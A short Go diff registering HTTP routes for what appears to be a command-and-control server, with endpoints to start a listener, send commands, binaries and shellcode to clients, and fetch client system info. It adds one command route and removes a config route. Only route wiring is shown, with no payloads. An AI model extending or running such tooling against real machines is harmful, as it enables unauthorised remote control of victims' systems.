@@ -7,6 +7,7 @@ import (
 	"net/http"
 )
 
+// NOTE: this function "connects" backend and frontend
 func RegisterHandlers() {
 	// Start listener endpoint
 	http.HandleFunc("/start-listener", startListenerHandler)
@@ -20,14 +21,15 @@ func RegisterHandlers() {
 	// Send command to client
 	http.HandleFunc("/send-command", sendCommandHandler)
 
+	// TODO
+	// Send MY command to client
+	http.HandleFunc("/my-send-command", mySendCommandHandler)
+
 	// Send file to client
 	http.HandleFunc("/send-binary", sendBinaryHandler)
 
 	// Send shellcode to client
 	http.HandleFunc("/send-shellcode", sendShellcodeHandler)
-
-	// Update client configuration
-	http.HandleFunc("/update-config", updateConfigHandler)
 
 	// Get client system info
 	http.HandleFunc("/get-client-info", getClientInfoHandler)
